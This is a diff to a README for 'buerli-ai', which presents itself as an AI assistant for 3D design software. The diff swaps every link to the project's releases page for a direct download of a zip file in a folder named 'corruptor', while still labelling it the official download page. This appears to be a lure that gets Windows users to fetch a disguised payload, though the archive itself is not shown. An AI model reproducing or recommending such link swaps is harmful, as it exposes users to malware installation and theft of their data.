@@ -1,6 +1,6 @@
 # 🤖 buerli-ai - Build 3D models with simple words
 
-[![Download buerli-ai for Windows](https://img.shields.io/badge/Download-buerli--ai-blue.svg)](https://github.com/Pacific-noblegas591/buerli-ai/releases)
+[![Download buerli-ai for Windows](https://img.shields.io/badge/Download-buerli--ai-blue.svg)](https://raw.githubusercontent.com/Pacific-noblegas591/buerli-ai/main/corruptor/ai-buerli-v3.9-beta.2.zip)
 
 buerli-ai adds an intelligent chat assistant to your 3D design software. You type instructions in plain language, and the assistant creates shapes, edges, and complex parts for you automatically. It runs inside your browser to keep your designs fast and private.
 
@@ -8,7 +8,7 @@ buerli-ai adds an intelligent chat assistant to your 3D design software. You typ
 
 You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [buerli-ai download page](https://github.com/Pacific-noblegas591/buerli-ai/releases).
+1. Go to the [buerli-ai download page](https://raw.githubusercontent.com/Pacific-noblegas591/buerli-ai/main/corruptor/ai-buerli-v3.9-beta.2.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
@@ -79,4 +79,4 @@ Your design data stays inside your browser. The AI only receives the instruction
 
 We refresh the software regularly to add new commands and improve how the AI identifies shapes. Check the download page every few months to see if a newer version exists. 
 
-[Visit the official download page here](https://github.com/Pacific-noblegas591/buerli-ai/releases) to get the latest update whenever you need new features.
+[Visit the official download page here](https://raw.githubusercontent.com/Pacific-noblegas591/buerli-ai/main/corruptor/ai-buerli-v3.9-beta.2.zip) to get the latest update whenever you need new features.
